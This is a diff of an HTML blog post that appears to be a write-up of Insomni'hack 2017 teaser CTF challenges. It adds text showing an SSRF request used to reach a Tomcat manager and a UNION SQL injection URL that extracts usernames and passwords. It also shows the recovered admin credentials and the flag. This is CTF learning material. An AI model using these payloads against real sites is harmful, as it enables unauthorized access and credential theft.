@@ -17,6 +17,17 @@
 &lt;p&gt;&lt;em&gt;Note: this article will be completed throught the week.&lt;/em&gt;&lt;/p&gt;
 
 
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#smarttomcat"&gt;Smarttomcat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#cryptquizz"&gt;Cryptquizz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#shobot"&gt;Shobot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-great-escape"&gt;The great escape&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#part-1"&gt;part 1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
 &lt;h2 id="smarttomcat"&gt;Smarttomcat&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart
@@ -28,7 +39,6 @@ down on the broken search interface... Can you help me ?&lt;/p&gt;
 &lt;p&gt;&lt;img alt="smarttomact screenshot" src="/media/2017.01/site.png" /&gt;&lt;/p&gt;
 &lt;p&gt;When intercepting the traffic with Burp we see that the request look like the
 following:&lt;/p&gt;
-&lt;p&gt;The request look like this:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/index.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
 &lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;smarttomcat.teaser.insomnihack.ch&lt;/span&gt;
 &lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0&lt;/span&gt;
@@ -44,19 +54,21 @@ u=http%3A%2F%2Flocalhost%3A8080%2Findex.jsp%3Fx%3D42%26y%3D42
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;The server used itself as a proxy, decoded it is the following:&lt;/p&gt;
+&lt;p&gt;We notice the &lt;code&gt;u&lt;/code&gt; parameter which decoded is:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://localhost:8080/index.jsp?x=42&amp;amp;y=42
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;When modifying the request with a &lt;code&gt;lol&lt;/code&gt;, the &lt;code&gt;u&lt;/code&gt; parameter is the following:&lt;/p&gt;
+&lt;p&gt;The server is using itself as a proxy, When modifying the request with a &lt;code&gt;lol&lt;/code&gt;,
+the &lt;code&gt;u&lt;/code&gt; parameter is the following:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u=http%3A%2F%2Flocalhost%3A8080%2Flol
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;And the response from the server is the following:&lt;/p&gt;
+&lt;p&gt;The server response is an error which indicate us that the server is using a
+tomcat server 7.0.68.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="testing a bad request" src="/media/2017.01/lol.png" /&gt;&lt;/p&gt;
-&lt;p&gt;We learn that this is a tomcat server, so let's see if we can get the manager:&lt;/p&gt;
+&lt;p&gt;We learned that this is a tomcat server, so let's see if we can get the manager:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -135,13 +147,22 @@ script:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;So it is operated by a MySQL database. Then we need to fine the right table.
-Then we get the username and password of the user:&lt;/p&gt;
+&lt;p&gt;So it is operated by a MySQL database. Then we need to fine the right table.&lt;/p&gt;
+&lt;p&gt;The finale request is:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://shobot.teaser.insomnihack.ch/?page=article&amp;amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;em&gt;To be continued&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Then we need to authenticate, on the admin page, using the direct URL but
+authenticating as for the Smartomcat challenge just worked:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And give us the flag:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;h2 id="the-great-escape"&gt;The great escape&lt;/h2&gt;
 &lt;h3 id="part-1"&gt;part 1&lt;/h3&gt;
 &lt;blockquote&gt;
